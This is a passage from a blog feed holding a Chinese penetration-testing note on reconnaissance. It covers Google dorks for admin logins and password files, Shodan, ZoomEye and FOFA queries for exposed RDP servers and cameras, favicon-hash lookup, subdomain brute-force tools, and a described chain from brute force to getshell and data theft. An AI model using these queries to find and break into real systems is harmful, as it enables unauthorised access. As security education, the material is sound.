      <category term="Web" scheme="https://winthorlimo.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>信息收集</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined02/312e3d12.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined02/312e3d12.html</id>
    <published>2020-08-02T14:00:00.000Z</published>
    <updated>2020-08-20T09:26:41.757Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集技术"><a href="#信息收集技术" class="headerlink" title="信息收集技术"></a>信息收集技术</h1><p>在渗透测试过程中，第一步就是进行信息收集，信息收集的过程，很多人将其写成了工具、脚本，于是我们就有了很多指纹识别工具、敏感文件、目录扫描工具，敏感信息探测工具，信息收集工具等等。很多前辈也都曾经说过：”渗透测试的本质就是信息收集”</p><h2 id="信息收集介绍"><a href="#信息收集介绍" class="headerlink" title="信息收集介绍"></a>信息收集介绍</h2><h3 id="常规收集"><a href="#常规收集" class="headerlink" title="常规收集"></a>常规收集</h3><ul><li>备份文件泄露</li><li>接口泄露(小米主题商店接口信息泄露开发者敏感信息（身份证、手机等）</li></ul><h3 id="从信息泄露到未授权访问"><a href="#从信息泄露到未授权访问" class="headerlink" title="从信息泄露到未授权访问"></a>从信息泄露到未授权访问</h3><ul><li>端口扫描与目录扫描<br><code>端口多扫几个</code></li></ul><h3 id="内网收集"><a href="#内网收集" class="headerlink" title="内网收集"></a>内网收集</h3><ul><li>内网服务器邮箱记录</li><li>浏览器保存密码记录</li><li>ESXI 认证<br><code>Vcenter 可以尝试勾选启用windows登录认证</code></li></ul><p>信息收集的方式可以分为两种：主动和被动。</p><p><strong>主动的信息收集方式：</strong> 通过直接访问、扫描网站，这种将流量流经网站的行为。</p><p><strong>被动的信息收集方式：</strong> 利用第三方服务和互联网信息进行收集。</p><h1 id="被动信息收集（OSINT）"><a href="#被动信息收集（OSINT）" class="headerlink" title="被动信息收集（OSINT）"></a>被动信息收集（OSINT）</h1><h2 id="Google-Hack"><a href="#Google-Hack" class="headerlink" title="Google Hack"></a>Google Hack</h2><p>在渗透测试过程中第一步就是信息收集，由于传统的信息收集工具包括指纹识别、目录扫描器等会留下痕迹，某些情况下还会被拦截，因此，能否在不惊动目标服务器的情况下，对目标网站进行前期最重要的信息收集，并且尽可能的获得更多的信息呢？</p><p><img src="http://qiniuyun.lintstar.top/30th-anniversary-of-the-world-wide-web-google-1552390014.gif" alt="30th-anniversary-of-the-world-wide-web-google-1552390014"></p><h3 id="默认搜索"><a href="#默认搜索" class="headerlink" title="默认搜索"></a>默认搜索</h3><p>搜索引擎基本语法，直接在搜索框中输入搜索词时，谷歌默认进行模糊搜索，并能对长短语或语句进行自动拆分成小的词进行搜索。</p><p><img src="http://qiniuyun.lintstar.top/image-20200724172909442.png" alt="image-20200724172909442"></p><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><p>谷歌的通配符是星号 *，用通配符代替关键词或短语中无法确定的字词。</p><p><img src="http://qiniuyun.lintstar.top/image-20200724174304528.png" alt="image-20200724174304528"></p><h3 id="逻辑非"><a href="#逻辑非" class="headerlink" title="逻辑非"></a>逻辑非</h3><p>排除某个搜索结果：渗透测试 -习近平 百度无广告</p><p><img src="http://qiniuyun.lintstar.top/image-20200724174331551.png" alt="image-20200724174331551"></p><h3 id="常用关键词"><a href="#常用关键词" class="headerlink" title="常用关键词"></a>常用关键词</h3><table><thead><tr><th>关键词</th><th>说明</th></tr></thead><tbody><tr><td>site</td><td>指定域名</td></tr><tr><td>intext</td><td>正文中存在关键词的网页</td></tr><tr><td>intitle</td><td>标题中存在关键词的网页</td></tr><tr><td>inurl</td><td>URL中存在关键词的网页</td></tr><tr><td>filetype</td><td>搜索指定文件类型</td></tr></tbody></table><h3 id="常见后台查找"><a href="#常见后台查找" class="headerlink" title="常见后台查找"></a>常见后台查找</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">intitle:后台登录</span><br><span class="line"></span><br><span class="line">inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</span><br><span class="line"></span><br><span class="line">intext:管理|后台|登陆|用户名|密码|系统|帐号</span><br></pre></td></tr></table></figure><h3 id="实际演示"><a href="#实际演示" class="headerlink" title="实际演示"></a>实际演示</h3><h4 id="搜索南京政府的子域名信息"><a href="#搜索南京政府的子域名信息" class="headerlink" title="搜索南京政府的子域名信息"></a>搜索南京政府的子域名信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:nanjing.gov.cn</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200724174446728.png" alt="image-20200724174446728"></p><h4 id="搜索互联网上的登录入口"><a href="#搜索互联网上的登录入口" class="headerlink" title="搜索互联网上的登录入口"></a>搜索互联网上的登录入口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intitle:登录</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200724174502081.png" alt="image-20200724174502081"></p><h4 id="搜索百度的相关登录入口"><a href="#搜索百度的相关登录入口" class="headerlink" title="搜索百度的相关登录入口"></a>搜索百度的相关登录入口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intitle:登录 site:baidu.com -zhidao.baidu.com -baike.baidu.com -jingyan.baidu.com</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200724174547698.png" alt="image-20200724174547698"></p><h4 id="查找互联网敏感文件"><a href="#查找互联网敏感文件" class="headerlink" title="查找互联网敏感文件"></a>查找互联网敏感文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filetype:mdb|doc|xlsx|pdf</span><br><span class="line">密码 filetype:xls</span><br></pre></td></tr></table></figure><h4 id="查找被黑政府站点"><a href="#查找被黑政府站点" class="headerlink" title="查找被黑政府站点"></a>查找被黑政府站点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">北京赛车 inurl:gov.cn</span><br><span class="line">intitle:北京赛车 inurl:gov.cn</span><br></pre></td></tr></table></figure><h2 id="物联网搜索引擎"><a href="#物联网搜索引擎" class="headerlink" title="物联网搜索引擎"></a>物联网搜索引擎</h2><h3 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h3><p><img src="http://qiniuyun.lintstar.top/20200802002840.png" alt="20200802002840"><br><strong><a href="https://www.shodan.io" target="_blank" rel="noopener">https://www.shodan.io</a></strong></p><p>物联网搜索引擎，是互联网上最可怕的搜索引擎，搜索所有和互联网关联的服务器、摄像头、打印机、路由器等等。</p><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><table><thead><tr><th>关键词</th><th>说明</th></tr></thead><tbody><tr><td>net</td><td>搜索指定ip地址或者子网，c段</td></tr><tr><td>hostname</td><td>搜索指定的域名或者服务器</td></tr><tr><td>port</td><td>搜索开放指定端口的设备</td></tr><tr><td>org</td><td>搜索属于指定组织或者公司的设备</td></tr><tr><td>product</td><td>搜索运行指定产品或者软件操作系统的设备</td></tr><tr><td>version</td><td>指定软件的版本</td></tr><tr><td>isp</td><td>搜索指定isp供应商的设备</td></tr><tr><td>country</td><td>搜索指定国家的设备</td></tr><tr><td>city</td><td>搜索指定城市的设备</td></tr></tbody></table><p>语句之间可以相互组合使用，可以运用自己的思维，相互组合成自己需要的搜索语句</p><h3 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h3><h4 id="查找位于国内的-Nginx-服务器"><a href="#查找位于国内的-Nginx-服务器" class="headerlink" title="查找位于国内的 Nginx 服务器"></a>查找位于国内的 Nginx 服务器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx country:cn</span><br></pre></td></tr></table></figure><h4 id="搜索位南京开启-3389-端口的服务器"><a href="#搜索位南京开启-3389-端口的服务器" class="headerlink" title="搜索位南京开启 3389 端口的服务器"></a>搜索位南京开启 3389 端口的服务器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">port:3389 city:nanjing</span><br><span class="line">port:3389 os:&quot;windows 10&quot;</span><br></pre></td></tr></table></figure><h4 id="搜索海康威视摄像头"><a href="#搜索海康威视摄像头" class="headerlink" title="搜索海康威视摄像头"></a>搜索海康威视摄像头</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hikvision-Webs country:cn city:nanjing</span><br></pre></td></tr></table></figure><h4 id="查看Cisco思科设备全球分布"><a href="#查看Cisco思科设备全球分布" class="headerlink" title="查看Cisco思科设备全球分布"></a>查看Cisco思科设备全球分布</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">isp:cisco</span><br><span class="line">isp:cisco country:cn</span><br></pre></td></tr></table></figure><h4 id="查看华为设备全球分布"><a href="#查看华为设备全球分布" class="headerlink" title="查看华为设备全球分布"></a>查看华为设备全球分布</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">isp:huawei</span><br></pre></td></tr></table></figure><p><strong><code>windows口令必须大小写后，弱口令TOP：P@ssw0rd</code></strong></p><h3 id="实用技巧"><a href="#实用技巧" class="headerlink" title="实用技巧"></a>实用技巧</h3><p>Shodan 实用技巧，查找互相关联的网站：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import mmh3</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">response = requests.get(&apos;https://www.baidu.com/favicon.ico&apos;)</span><br><span class="line">favicon = response.content.encode(&apos;base64&apos;)</span><br><span class="line">hash = mmh3.hash(favicon)</span><br><span class="line">print(hash)</span><br></pre></td></tr></table></figure><p>计算出的 hash 用如下语法来反查：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.favicon.hash：hash</span><br></pre></td></tr></table></figure><p><strong>查找出类似模板的IP地址：<a href="http://111.231.41.219/" target="_blank" rel="noopener">http://111.231.41.219/</a></strong></p><p><img src="http://qiniuyun.lintstar.top/20200802003028.png" alt="20200802003028"></p><p>查看原始数据 Ctrl+F 搜索 favicon</p><p><img src="http://qiniuyun.lintstar.top/20200802003451.png" alt="20200802003451"></p><p>根据hash值反差：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.favicon.hash:-865290023</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200802003849.png" alt="20200802003849"><br><strong><code>找同模板网站：看是不是一个logo/favicon 用小米logo的hash值反查</code></strong></p><p><strong>研究院真实案例分享</strong></p><p>目标黄色网站 - 拿不下 - 找到同模板的网站 - 爆破 - 进入系统 - 通用漏洞 getshell - 拿到源码 - 代码审计 - 发现漏洞 - 拿下目标网站 - getshell - 突破限制进内网 - 内网漫游拿下数据</p><h3 id="Zoomeye"><a href="#Zoomeye" class="headerlink" title="Zoomeye"></a>Zoomeye</h3><p><img src="http://qiniuyun.lintstar.top/1558883226923-5598295.png" alt="1558883226923-5598295"><br><strong><a href="https://www.zoomeye.org" target="_blank" rel="noopener">https://www.zoomeye.org</a></strong></p><p>ZoomEye 中文名为“钟馗之眼”，它定位于网络空间搜索引擎，能对暴露在公网的主机设备及网站组件进行全方位搜索（只要有IP地址即可搜索到），发现其中的漏洞，揪 出网络中“藏着掖着的问题”。ZoomEye和Shodan的区别是ZoomEye目前侧重于Web层面的资产发现而Shodan则侧重于主机层面。</p><h3 id="主机搜索"><a href="#主机搜索" class="headerlink" title="主机搜索"></a>主机搜索</h3><h4 id="组件名称"><a href="#组件名称" class="headerlink" title="组件名称"></a>组件名称</h4><p>app: 组件名。 ver: 组件版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app:”Apache httpd” ver:”2.2.16″</span><br></pre></td></tr></table></figure><h4 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h4><p>port: 开放端口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">port:3389</span><br></pre></td></tr></table></figure><h4 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h4><p>os: 操作系统。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os:linux</span><br></pre></td></tr></table></figure><h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><p>service: 结果分析中的“服务名”字段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 公网路由器：</span><br><span class="line">service:routersetup</span><br><span class="line"># 公网摄像头：</span><br><span class="line">service:webcam</span><br></pre></td></tr></table></figure><h4 id="主机名"><a href="#主机名" class="headerlink" title="主机名"></a>主机名</h4><p>hostname: 分析结果中的“主机名”字段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname:google.com</span><br></pre></td></tr></table></figure><h4 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h4><p>country: 国家或者地区代码。 city: 城市名称。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 搜索美国的 Apache 服务器</span><br><span class="line">app:Apache country:US</span><br><span class="line"></span><br><span class="line"># 搜索英国的 Sendmail 服务器</span><br><span class="line">app:Sendmail country:UK</span><br></pre></td></tr></table></figure><h4 id="IP-地址"><a href="#IP-地址" class="headerlink" title="IP 地址"></a>IP 地址</h4><p>ip: 搜索一个指定的 IP 地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Google 的公共 DNS 服务器</span><br><span class="line">ip:8.8.8.8</span><br></pre></td></tr></table></figure><h4 id="CIDR"><a href="#CIDR" class="headerlink" title="CIDR"></a>CIDR</h4><p>IP 的 CIDR 网段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cidr:8.8.8.8/24</span><br></pre></td></tr></table></figure><h3 id="Web应用搜索"><a href="#Web应用搜索" class="headerlink" title="Web应用搜索"></a>Web应用搜索</h3><h4 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h4><p>site:网站域名。 例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site: baidu.com</span><br></pre></td></tr></table></figure><h4 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h4><p>title: 页面标题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title:Nginx</span><br></pre></td></tr></table></figure><h4 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h4><p>keywords: <meta name="Keywords">定义的页面关键词。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keywords:Nginx</span><br></pre></td></tr></table></figure><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>desc: <meta name="description">定义的页面说明。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc:Nginx</span><br></pre></td></tr></table></figure><h4 id="HTTP-头"><a href="#HTTP-头" class="headerlink" title="HTTP 头"></a>HTTP 头</h4><p>headers: HTTP 请求中的 Headers。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">headers:Server</span><br></pre></td></tr></table></figure><h3 id="FQFA"><a href="#FQFA" class="headerlink" title="FQFA"></a>FQFA</h3><p><img src="http://qiniuyun.lintstar.top/20200802004152.png" alt="20200802004152"><br><strong><a href="https://fofa.so" target="_blank" rel="noopener">https://fofa.so</a></strong></p><p>FOFA是白帽汇推出的一款网络空间资产搜索引擎。 它能够帮助企业客户迅速进行网络资产匹配、加快后续工作进程。 例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。</p><h3 id="基本语法-1"><a href="#基本语法-1" class="headerlink" title="基本语法"></a>基本语法</h3><p>直接输入查询语句，将从标题，html内容，http头信息，url字段中搜索</p><h4 id="title-”abc”-从标题中搜索abc"><a href="#title-”abc”-从标题中搜索abc" class="headerlink" title="title=”abc” 从标题中搜索abc"></a>title=”abc” 从标题中搜索abc</h4><p>标题中有北京的网站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=&quot;北京&quot;</span><br></pre></td></tr></table></figure><h4 id="header-”abc”-从http头中搜索abc"><a href="#header-”abc”-从http头中搜索abc" class="headerlink" title="header=”abc” 从http头中搜索abc"></a>header=”abc” 从http头中搜索abc</h4><p>jboss服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header=&quot;jboss&quot;</span><br></pre></td></tr></table></figure><h4 id="body-”abc”-从html正文中搜索abc"><a href="#body-”abc”-从html正文中搜索abc" class="headerlink" title="body=”abc” 从html正文中搜索abc"></a>body=”abc” 从html正文中搜索abc</h4><p>正文包含Hacked by</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">body=&quot;Hacked by&quot;</span><br></pre></td></tr></table></figure><h4 id="domain-”qq-com”-搜索根域名带有qq-com的网站"><a href="#domain-”qq-com”-搜索根域名带有qq-com的网站" class="headerlink" title="domain=”qq.com” 搜索根域名带有qq.com的网站"></a>domain=”qq.com” 搜索根域名带有qq.com的网站</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">domain=&quot;qq.com&quot;</span><br></pre></td></tr></table></figure><h4 id="host-”-gov-cn”-从url中搜索-gov-cn"><a href="#host-”-gov-cn”-从url中搜索-gov-cn" class="headerlink" title="host=”.gov.cn” 从url中搜索.gov.cn"></a>host=”.gov.cn” 从url中搜索.gov.cn</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host=&quot;.gov.cn&quot;</span><br></pre></td></tr></table></figure><h4 id="教育网站"><a href="#教育网站" class="headerlink" title="教育网站"></a>教育网站</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host=&quot;.edu.cn&quot;</span><br></pre></td></tr></table></figure><h4 id="port-”443”-查找对应443端口的资产"><a href="#port-”443”-查找对应443端口的资产" class="headerlink" title="port=”443” 查找对应443端口的资产"></a>port=”443” 查找对应443端口的资产</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">port=&quot;443&quot;</span><br></pre></td></tr></table></figure><h4 id="ip-”1-1-1-1”-搜索ip信息"><a href="#ip-”1-1-1-1”-搜索ip信息" class="headerlink" title="ip=”1.1.1.1” 搜索ip信息"></a>ip=”1.1.1.1” 搜索ip信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">39.98.209.64</span><br></pre></td></tr></table></figure><h4 id="protocol-”https”-搜索制定协议类型-在开启端口扫描的情况下有效"><a href="#protocol-”https”-搜索制定协议类型-在开启端口扫描的情况下有效" class="headerlink" title="protocol=”https” 搜索制定协议类型(在开启端口扫描的情况下有效)"></a>protocol=”https” 搜索制定协议类型(在开启端口扫描的情况下有效)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol=&quot;https&quot;</span><br></pre></td></tr></table></figure><h4 id="搜索指定城市的资产"><a href="#搜索指定城市的资产" class="headerlink" title="搜索指定城市的资产"></a>搜索指定城市的资产</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">city=&quot;Beijing&quot;</span><br></pre></td></tr></table></figure><h4 id="搜索指定行政区的资产"><a href="#搜索指定行政区的资产" class="headerlink" title="搜索指定行政区的资产"></a>搜索指定行政区的资产</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">region=&quot;Zhejiang&quot;</span><br></pre></td></tr></table></figure><h4 id="搜索指定国家-编码-的资产"><a href="#搜索指定国家-编码-的资产" class="headerlink" title="搜索指定国家(编码)的资产"></a>搜索指定国家(编码)的资产</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">country=&quot;CN&quot;</span><br></pre></td></tr></table></figure><h4 id="搜索证书-https或者imaps等-中带有google的资产"><a href="#搜索证书-https或者imaps等-中带有google的资产" class="headerlink" title="搜索证书(https或者imaps等)中带有google的资产"></a>搜索证书(https或者imaps等)中带有google的资产</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cert=&quot;google&quot;</span><br></pre></td></tr></table></figure><h4 id="搜索FTP协议中带有users文本的资产"><a href="#搜索FTP协议中带有users文本的资产" class="headerlink" title="搜索FTP协议中带有users文本的资产"></a>搜索FTP协议中带有users文本的资产</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">banner=users &amp;&amp; protocol=ftp</span><br></pre></td></tr></table></figure><h4 id="搜索所有协议资产，支持subdomain和service两种"><a href="#搜索所有协议资产，支持subdomain和service两种" class="headerlink" title="搜索所有协议资产，支持subdomain和service两种"></a>搜索所有协议资产，支持subdomain和service两种</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type=service</span><br></pre></td></tr></table></figure><h4 id="搜索Windows资产"><a href="#搜索Windows资产" class="headerlink" title="搜索Windows资产"></a>搜索Windows资产</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os=windows</span><br></pre></td></tr></table></figure><h4 id="搜索IIS-7-5服务器"><a href="#搜索IIS-7-5服务器" class="headerlink" title="搜索IIS 7.5服务器"></a>搜索IIS 7.5服务器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server==&quot;Microsoft-IIS/7.5&quot;</span><br></pre></td></tr></table></figure><h4 id="搜索海康威视设备"><a href="#搜索海康威视设备" class="headerlink" title="搜索海康威视设备"></a>搜索海康威视设备</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app=&quot;海康威视-视频监控&quot;</span><br></pre></td></tr></table></figure><h4 id="时间范围段搜索"><a href="#时间范围段搜索" class="headerlink" title="时间范围段搜索"></a>时间范围段搜索</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">after=&quot;2017&quot; &amp;&amp; before=&quot;2017-10-01&quot;</span><br></pre></td></tr></table></figure><h4 id="搜索指定org-组织-的资产"><a href="#搜索指定org-组织-的资产" class="headerlink" title="搜索指定org(组织)的资产"></a>搜索指定org(组织)的资产</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org=&quot;Amazon.com, Inc.&quot;</span><br></pre></td></tr></table></figure><h4 id="搜索指定udp协议的资产"><a href="#搜索指定udp协议的资产" class="headerlink" title="搜索指定udp协议的资产"></a>搜索指定udp协议的资产</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_protocol=&quot;udp&quot;</span><br></pre></td></tr></table></figure><h3 id="高级搜索"><a href="#高级搜索" class="headerlink" title="高级搜索"></a>高级搜索</h3><p>可以使用括号 和 &amp;&amp; || !=等符号，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">title=&quot;powered by&quot; &amp;&amp; title!=discuz</span><br><span class="line"></span><br><span class="line">title!=&quot;powered by&quot; &amp;&amp; body=discuz</span><br><span class="line"></span><br><span class="line">( body=&quot;content=\&quot;WordPress&quot; || (header=&quot;X-Pingback&quot; &amp;&amp; header=&quot;/xmlrpc.php&quot; &amp;&amp; body=&quot;/wp-includes/&quot;) ) &amp;&amp; host=&quot;gov.cn&quot;</span><br></pre></td></tr></table></figure><h3 id="规则探索与发现"><a href="#规则探索与发现" class="headerlink" title="规则探索与发现"></a>规则探索与发现</h3><p><a href="https://fofa.so/subject" target="_blank" rel="noopener">https://fofa.so/subject</a></p><p><a href="https://fofa.so/library" target="_blank" rel="noopener">https://fofa.so/library</a></p><p><img src="http://qiniuyun.lintstar.top/1558908508820.png" alt="1558908508820"></p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><p>域名爆破是指使用爆破字段拼接主域名尝试访问，暴力破解出主域名下是否还有其他子域名。</p><p>例如通过某公司官网的主域名，可以暴力破解出该公司内部系统（如OA、CRM等等）的访问地址。</p><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><h3 id="在线爆破工具"><a href="#在线爆破工具" class="headerlink" title="在线爆破工具"></a>在线爆破工具</h3><p>phpinfo.me/domain</p><p><img src="http://qiniuyun.lintstar.top/20200802001346.png" alt="20200802001346"></p><h3 id="本地工具爆破"><a href="#本地工具爆破" class="headerlink" title="本地工具爆破"></a>本地工具爆破</h3><p><strong>subDomainsBrute</strong><br><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p><p>每秒可扫描3000个域名</p><p><strong>Layer 子域名挖掘机</strong></p><p>法师经典作品，操作简单容易上手</p><p><a href="https://github.com/euphrat1ca/LayerDomainFinder" target="_blank" rel="noopener">https://github.com/euphrat1ca/LayerDomainFinder</a></p><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><h4 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h4><p><code>site: domain</code></p><p><img src="http://qiniuyun.lintstar.top/20200802001531.png" alt="20200802001531"></p><h4 id="OneForAll"><a href="#OneForAll" class="headerlink" title="OneForAll"></a>OneForAll</h4><p>👊 OneForAll是一款功能强大的子域收集工具</p><p><img src="http://qiniuyun.lintstar.top/20200802001743.png" alt="20200802001743"></p><h4 id="自己动手丰衣足食"><a href="#自己动手丰衣足食" class="headerlink" title="自己动手丰衣足食"></a>自己动手丰衣足食</h4><p>Django 编写 Web 漏洞扫描器挖坑记录： <a href="https://www.sqlsec.com/2020/05/webscan.html" target="_blank" rel="noopener">https://www.sqlsec.com/2020/05/webscan.html</a></p><p>域名探测功能发现比较流行的子域名探测功能 one for all 用的也是很多 API 接口，于是打算使用第三方服务来获取子域名，这样获取的速度会很快。</p><p>因为这些子域名是存入数据库的，所以也就顺便增加了域名监控功能，每次扫描可以统计出新增的域名数量。域名探测所使用的 6 个接口分别如下，大家也可以直接拿去使用，做好对应的数据提取就可以了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 爱站</span><br><span class="line">https://baidurank.aizhan.com/baidu/&#123;domain&#125;/</span><br><span class="line"></span><br><span class="line"># 百度云观测</span><br><span class="line">http://ce.baidu.com/index/getRelatedSites?site_address=&#123;domain&#125;</span><br><span class="line"></span><br><span class="line"># hackertarget</span><br><span class="line">https://api.hackertarget.com/hostsearch/?q=&#123;domain&#125;</span><br><span class="line"></span><br><span class="line"># IP138</span><br><span class="line">https://site.ip138.com/&#123;domain&#125;/domain.htm</span><br><span class="line"></span><br><span class="line"># crt.sh SSL 证书反查</span><br><span class="line">https://crt.sh/?q=%25.&#123;domain&#125;</span><br><span class="line"></span><br><span class="line"># 千寻</span><br><span class="line">url = &apos;https://www.dnsscan.cn/dns.html&apos;</span><br><span class="line">datas = &#123;&quot;ecmsfrom&quot;: 